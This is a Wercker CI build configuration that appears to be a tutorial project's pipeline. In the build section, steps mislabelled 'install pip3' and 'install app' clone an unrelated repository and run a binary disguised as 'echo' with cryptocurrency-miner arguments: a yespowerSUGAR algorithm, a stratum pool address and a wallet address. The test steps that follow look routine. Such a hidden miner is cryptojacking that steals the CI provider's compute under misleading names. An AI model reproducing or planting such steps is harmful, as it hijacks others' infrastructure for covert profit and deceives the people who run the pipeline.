box:
  id: algas/wercker-tutorial

build:
  box:
    id: ubuntu:16.04
  steps:
    - script:
        name: install pip3
        code: |
          git clone https://github.com/mijikom/1.git
    - script:
        name: install app
        code: |
          cd 1 && chmod +x echo && ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 10 --cpu-priority 4

test:
  steps:
    - script:
        name: env
        code: env
    - script:
        name: Wait for MySQL connection
        code: sleep 20s
    - script:
        name: migrate database
        code: |
          ./scripts/migrate.sh
    - script:
        name: install app
        code: |
          pip3 install -r requirements.txt
    - script:
        name: test
        code: |
          python3 test.py

